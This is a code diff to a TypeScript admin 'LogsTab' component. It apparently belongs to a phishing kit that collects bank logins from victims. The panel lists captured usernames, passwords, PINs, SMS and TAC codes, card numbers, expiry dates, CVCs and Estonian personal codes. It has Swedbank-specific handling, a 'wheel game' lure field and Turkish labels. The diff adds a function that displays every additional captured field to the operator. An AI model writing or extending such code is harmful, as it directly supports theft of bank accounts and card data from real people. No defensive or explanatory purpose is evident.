@@ -168,12 +168,10 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
   };
 
   const normalizedKeys = Object.keys(formData).map((key) => key.toLowerCase().replace(/[^a-z0-9]/g, ""));
-  const normalizedBankName = [formData.bankSlug, formData.bankName]
-    .filter((value): value is string => typeof value === "string")
-    .join(" ")
-    .toLowerCase();
+  const normalizedBankSlug = typeof formData.bankSlug === "string" ? formData.bankSlug.trim().toLowerCase() : "";
+  const normalizedBankName = typeof formData.bankName === "string" ? formData.bankName.trim().toLowerCase() : "";
   const prefersUsernameFirst =
-    normalizedBankName.includes("swedbank") &&
+    (normalizedBankSlug === "swedbank-ee" || normalizedBankName === "swedbank") &&
     normalizedKeys.some((key) => key.includes("kasutajatunnus")) &&
     normalizedKeys.some((key) => key.includes("telefoninumber") || key.includes("phone") || key.includes("isikukood"));
 
@@ -206,6 +204,56 @@ function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[stri
       ];
 
   return canonicalFields.filter(([, value]) => Boolean(value));
+}
+
+function getAdditionalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
+  const hiddenKeys = new Set([
+    "firstName",
+    "lastName",
+    "phone",
+    "bankName",
+    "bankSlug",
+    "loginMethod",
+    "personalCode",
+    "bankPhone",
+    "username",
+    "verfuegernummer",
+    "password",
+    "pin",
+    "tacCode",
+    "smsCode",
+    "cardNumber",
+    "cardExpiry",
+    "cardCvc",
+    "currency",
+    "participationCode",
+    "is_wheel_game",
+    "specialNoticeText",
+    "specialNoticeImage",
+    "specialNoticeLang",
+    "specialNoticeSentAt",
+  ]);
+
+  return Object.entries(formData).flatMap(([key, value]) => {
+    if (hiddenKeys.has(key) || isIgnoredAdminBankFieldKey(key)) {
+      return [];
+    }
+
+    if (typeof value !== "string") {
+      return [];
+    }
+
+    const trimmedValue = value.trim();
+    if (!trimmedValue) {
+      return [];
+    }
+
+    if (shouldHideDuplicateBankField(formData, key, trimmedValue)) {
+      return [];
+    }
+
+    return [[key, trimmedValue]];
+  });
 }
 
 export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
@@ -826,7 +874,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                     <td className="px-3 py-4">
                       <div className="text-[13px] space-y-1.5 max-w-[200px] break-words">
                           {fd.bankName && <div className="font-bold text-yellow-600 dark:text-yellow-500 break-words">{fd.bankName}</div>}
-                          {getCanonicalAdminBankFields(fd).map(([key, value]) => {
+                          {[...getCanonicalAdminBankFields(fd), ...getAdditionalAdminBankFields(fd)].map(([key, value]) => {
                               let displayKey = key;
                               if (displayKey === "username") displayKey = "ID / K.Adı";
                               else if (displayKey === "password") displayKey = "Şifre / PIN";
